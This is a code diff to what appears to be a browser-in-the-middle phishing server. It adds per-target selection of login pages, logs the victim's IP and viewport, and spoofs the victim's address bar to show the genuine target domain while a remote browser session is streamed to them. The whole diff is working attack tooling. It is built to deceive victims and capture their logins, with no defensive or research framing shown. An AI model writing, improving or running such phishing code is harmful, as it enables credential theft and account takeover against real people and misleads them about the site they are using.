@@ -343,41 +343,69 @@ fastify.ready(async function(err){
     socket.on('new_broadcast', async function(browser_id){
       const browser = browsers.get('browser_id', browser_id)
       browser.socket_id = socket.id
-      browser.target_page.on('framenavigated', function(frame){
-        if(frame.parentFrame() === null) {
-          if(browser.controller_socket !== undefined){
-            // Get the real URL from the target site
-            const realUrl = new URL(frame.url())
-            
-            // Use the stored spoofed domain (target domain) from when the victim connected
-            const spoofedDomain = browser.spoofed_domain || 'localhost:58082'
-            
-            // Construct spoofed URL: use target domain with real path/params so victim sees expected domain
-            const spoofedUrl = `https://${spoofedDomain}${realUrl.pathname}${realUrl.search}${realUrl.hash}`
-            
-            fastify.io.to(browser.controller_socket).emit('push_state', spoofedUrl)
-          }
-        }
-      })
     })
     socket.on('new_phish', async function(viewport_width, viewport_height, client_ip, target_id){
+      // Dynamically select target based on target_id parameter
+      const selectedTarget = targets[target_id] || target // fallback to startup target if target_id not found
+      
+      console.log(`Target ID received: ${target_id}`)
+      console.log(`Selected target: ${selectedTarget ? selectedTarget.login_page : 'NOT FOUND'}`)
+      console.log(`Available targets: ${Object.keys(targets).join(', ')}`)
+      
+      if (!selectedTarget) {
+        console.error(`Target '${target_id}' not found in targets.json`)
+        return // Don't process if target not found
+      }
+      
       empty_phishbowl.victim_ip = client_ip
       empty_phishbowl.victim_target_id = target_id
       empty_phishbowl.victim_width = viewport_width
       empty_phishbowl.victim_height = viewport_height
       
       // Extract target domain from the login_page URL for URL spoofing
-      const targetUrl = new URL(target.login_page)
+      const targetUrl = new URL(selectedTarget.login_page)
       empty_phishbowl.spoofed_domain = targetUrl.hostname
+      
+      console.log(`Target domain set to: ${empty_phishbowl.spoofed_domain}`)
       
       await resize_window(empty_phishbowl, empty_phishbowl.target_page, viewport_width, viewport_height)
       await empty_phishbowl.target_page.setViewport({width: viewport_width, height: viewport_height})
       empty_phishbowl.victim_socket = socket.id
       //start off this victim with control of the browser instance
       empty_phishbowl.controller_socket = socket.id
+      
+      // Set up framenavigated handler for this browser instance
+      empty_phishbowl.target_page.on('framenavigated', function(frame){
+        if(frame.parentFrame() === null) {
+          if(empty_phishbowl.controller_socket !== undefined){
+            // Get the real URL from the target site
+            const realUrl = new URL(frame.url())
+            
+            // Use the stored spoofed domain (target domain) from when the victim connected
+            const spoofedDomain = empty_phishbowl.spoofed_domain || 'localhost:58082'
+            
+            // Construct spoofed URL: use target domain with real path/params so victim sees expected domain
+            const spoofedUrl = `https://${spoofedDomain}${realUrl.pathname}${realUrl.search}${realUrl.hash}`
+            
+            console.log(`Navigation detected, spoofing URL to: ${spoofedUrl}`)
+            fastify.io.to(empty_phishbowl.controller_socket).emit('push_state', spoofedUrl)
+          }
+        }
+      })
+      
+      // Immediately spoof the URL with the current page
+      const currentUrl = new URL(empty_phishbowl.target_page.url())
+      const initialSpoofedUrl = `https://${empty_phishbowl.spoofed_domain}${currentUrl.pathname}${currentUrl.search}${currentUrl.hash}`
+      
+      // Add small delay to ensure client-side JS is ready
+      setTimeout(() => {
+        console.log(`Spoofing URL to: ${initialSpoofedUrl}`)
+        fastify.io.to(socket.id).emit('push_state', initialSpoofedUrl)
+      }, 1000)
+      
       fastify.io.to(empty_phishbowl.socket_id).emit('stream_video_to_first_viewer', socket.id)
       //console.log(empty_phishbowl)
-      empty_phishbowl = await get_browser(target.login_page)
+      empty_phishbowl = await get_browser(selectedTarget.login_page)
       browsers.push(empty_phishbowl)
     })
     socket.on('new_thumbnail', async function(thumbnail){
